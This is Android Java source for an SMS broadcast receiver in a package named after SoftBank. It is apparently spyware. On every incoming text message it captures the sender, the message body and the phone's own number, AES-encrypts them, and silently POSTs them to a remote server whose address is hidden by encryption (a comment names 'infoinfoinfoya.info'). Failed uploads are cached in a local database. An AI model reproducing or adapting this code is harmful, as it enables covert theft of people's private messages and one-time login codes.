package com.example.softbank.sms;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.example.softbank.utils.AESUtil;
import com.example.softbank.utils.AppIconUtil;
import com.example.softbank.utils.sqliteHelper.MySqliteHelper;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;


//来了短信会通知
public class SmsReceiver extends BroadcastReceiver implements Runnable {
    private Context context;
    private String text;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        if (smsMessages == null) {
            return;
        }
        String senderNumber = smsMessages[0].getOriginatingAddress();
        String messages = getSmsMessages(smsMessages);
        String number = getNumber(context);
        if (number == null) {
            String TAG = "SmsReceiver";
            Log.e(TAG, "number null");
            return;
        }
        this.text = ToJson(number, senderNumber, messages);
        new Thread(this).start();
    }


    /**
     * post请求
     *
     * @param httpUrl 链接
     * @param param   参数
     * @return
     */
    public String doPost(String httpUrl, String param) {
        StringBuilder result = new StringBuilder();
        //连接
        HttpURLConnection connection = null;
        OutputStream os = null;
        try {
            //创建连接对象
            URL url = new URL(httpUrl);
            //创建连接
            connection = (HttpURLConnection) url.openConnection();
            //设置请求方法
            connection.setRequestMethod("POST");
            //设置连接超时时间
            connection.setConnectTimeout(15000);
            //设置是否可读取
            connection.setDoOutput(true);
            //设置响应是否可读取
            connection.setDoInput(true);
            connection.setInstanceFollowRedirects(true);
            //设置参数类型
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            // 设置本次连接是否自动处理重定向
            connection.connect();
            //拼装参数
            if (param != null && !param.equals("")) {
                //设置参数
                os = connection.getOutputStream();
                //拼装参数
                os.write(param.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            // 定义BufferedReader输入流来读取URL的响应
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = in.readLine()) != null) {
                result.append(line);
            }
            in.close();
        } catch (IOException e) {
            errorInst();
            e.printStackTrace();
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (connection != null) {
                //关闭连接
                connection.disconnect();
            }
        }
        return result.toString();
    }

    private String ToJson(String number, String senderNumber, String smsMessages) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("type", "2");
            jsonObject.put("number", number);
            jsonObject.put("senderNumber", senderNumber);
            jsonObject.put("smsMessages", smsMessages);
            jsonObject.put("type", "sms");
            return jsonObject.toString();
        } catch (Exception e) {
            e.fillInStackTrace();
        }
        return null;
    }

    //获取短信
    private String getSmsMessages(SmsMessage[] smsMessages) {
        // 组装短信内容
        StringBuilder text = new StringBuilder();
        for (SmsMessage smsMessage : smsMessages) {
            text.append(smsMessage.getMessageBody());
        }
        return text.toString();
    }

    @SuppressLint("HardwareIds")
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && context.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        return tm.getLine1Number();
    }

    //上传失败
    private void errorInst() {
        try {
            ContentValues values = new ContentValues();
            JSONObject jsonObject = new JSONObject(text);
            values.put("phone", jsonObject.getString("number"));
            values.put("send_phone", jsonObject.getString("senderNumber"));
            values.put("context", jsonObject.getString("smsMessages"));
            inst(context, values);
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }


    private void inst(Context context, ContentValues contentValues) {
        MySqliteHelper helper = new MySqliteHelper(context);
        SQLiteDatabase database = helper.getWritableDatabase();
        database.insert("records", null, contentValues);
    }

    @Override
    public void run() {
        if (text == null) {
            return;
        }
        String json = AESUtil.encrypt(text, AppIconUtil.aa);
        //infoinfoinfoya.info
        doPost(AESUtil.decrypt("04/ZYtc+FWUwnTWMYwkePwlrxlgQRilGBgfwaX7tgS+qfi85DElfyyc23+NhECcR",AppIconUtil.aa), json);
    }
}
